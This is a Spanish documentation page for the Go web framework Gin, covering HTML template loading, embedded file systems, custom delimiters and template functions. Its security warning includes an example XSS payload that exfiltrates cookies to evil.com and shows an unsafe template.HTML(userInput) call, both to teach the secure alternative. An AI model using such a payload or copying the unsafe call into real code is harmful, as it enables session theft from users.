---
title: "Renderizado HTML"
sidebar:
  order: 9
---

Gin usa el paquete [html/template](https://pkg.go.dev/html/template) para el renderizado HTML.
Para más información sobre cómo usarlos, incluyendo los marcadores de posición disponibles, consulta la documentación de [text/template](https://pkg.go.dev/text/template)

Usa LoadHTMLGlob() o LoadHTMLFiles() para seleccionar los archivos HTML a cargar.

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

Usar plantillas con el mismo nombre en diferentes directorios

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**Nota:** Por favor envuelve tu plantilla HTML en el bloque `{{define <template-path>}} {{end}}` y define tu archivo de plantilla con la ruta relativa `<template-path>`. De lo contrario, GIN no analizará correctamente los archivos de plantilla.

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### Cargar plantillas desde un http.FileSystem (v1.11+)

Si tus plantillas están embebidas o proporcionadas por un `http.FileSystem`, usa `LoadHTMLFS`:

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### Advertencia de seguridad: `template.HTML()` omite el escape automático

El paquete `html/template` de Go escapa automáticamente los valores insertados en las plantillas para prevenir Cross-Site Scripting (XSS). Sin embargo, cuando conviertes una cadena a `template.HTML()`, omites explícitamente esta protección. Si la cadena contiene entrada proporcionada por el usuario, un atacante puede inyectar JavaScript arbitrario.

**Inseguro -- nunca uses `template.HTML()` con entrada del usuario:**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**Seguro -- deja que el motor de plantillas escape la entrada del usuario automáticamente:**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

Solo usa `template.HTML()` para contenido que controlas completamente, como fragmentos HTML estáticos definidos en tu propio código. Nunca lo uses con valores que provengan de entrada del usuario, campos de base de datos poblados por usuarios, o cualquier otra fuente no confiable.

### Renderizador de plantillas personalizado

También puedes usar tu propio renderizador de plantillas HTML

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### Delimitadores personalizados

Puedes usar delimitadores personalizados

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### Funciones de plantilla personalizadas

Consulta el [código de ejemplo](https://github.com/gin-gonic/examples/tree/master/template) detallado.

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

Resultado:

```sh
Date: 2017/07/01
```
